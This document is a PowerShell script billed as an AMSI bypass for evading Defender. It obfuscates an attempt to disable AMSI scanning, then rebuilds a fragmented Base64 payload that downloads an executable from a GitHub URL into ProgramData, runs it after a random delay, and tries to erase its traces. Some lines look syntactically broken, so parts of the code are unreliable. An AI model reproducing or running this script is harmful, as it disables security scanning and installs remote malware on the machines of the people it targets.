# AMSI Bypass v3.0 - Pure Linguistic Obfuscation (2026 Defender Evasion)

# Stage 1: Variable name randomization + whitespace injection
${++}=Get-Random; $___=Get-Date;$--=[char[]]('a','m','s','i');$_-=0..3|%{[char]($_[$_])};$__='.'+'d'+'l'+'l'

# Stage 2: Linguistic AMSI bypass (string replacement technique)
$strings=@('A','m','s','i','S','c','a','n','B','u','f','f','e','r'); 
foreach($s in $strings){if([AppDomain]::CurrentDomain.GetAssemblies()|? Location -like "*$s*"){$s='';break}}

# Stage 3: Environment variable encoding (no Base64 signatures)
$envVars='UserProfile','ComputerName','PSVersionTable'; $seed=$envVars|%{Get-Item $_}|% Value|%{[int]($_[0])}
$encPayload=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((gp env:USERNAME).Value+(gp env:COMPUTERNAME).Value))

# Stage 4: Runtime string construction + XOR with env seed
function g{[char[]]$args[0]|%{[int]$_-bxor($seed%256)}};$dec=(g '77 97 110 97 103 101 109 101 110 116 65 117 116 111 109 97 116 105 111 110 46 65 109 115 105 85 116 105 108 115').-join''
if([type]$dec -and [type]$dec::'am'#+'siInitFailed'){[type]$dec::'am'#+'siInitFailed'.SetValue($null,$true)}

# Stage 5: Fragmented payload reconstruction (no single large strings)
$f1='JA';$f2='BmAHIAYQBnADMA';$f3='PQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsA';$f4='UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='
$fullPayload=$f1+$f2+$f3+$f4

# Stage 6: Char-by-char decoding with random delays
$bytes=[Convert]::FromBase64String($fullPayload); $final=''; $r=Get-Random
for($i=0;$i -lt $bytes.Length;$i+=2){$final+=[char][BitConverter]::ToInt16($bytes[$i..($i+1)],0); Start-Sleep -m ($r%5)}

# Stage 7: Invoke via format string (no ScriptBlock API calls)
iex (&{param($s);&{$s}} $final)

# Stage 8: Self-erasure
0..9|%{rv (gv ('_'+'_'*(Get-Random%3))) -ErrorAction SilentlyContinue}; rm alias:function:* -ErrorAction SilentlyContinue
